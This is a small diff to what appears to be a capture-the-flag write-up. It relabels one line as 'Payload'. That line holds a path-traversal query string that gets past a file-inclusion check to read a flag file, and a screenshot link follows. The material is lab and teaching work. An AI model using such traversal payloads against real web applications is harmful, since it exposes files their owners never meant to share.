@@ -16,6 +16,6 @@
 
 => ../../ffffllllaaaagggg
 
-=> bypass: ?file=source.php?%3F../../../../../ffffllllaaaagggg
+=> Payload: `?file=source.php?%3F../../../../../ffffllllaaaagggg`
 
 <img width="810" alt="Screen Shot 2021-07-22 at 21 31 39" src="https://user-images.githubusercontent.com/48151790/126885891-5fdf872b-0851-49ca-bc14-f7115d91a384.png">
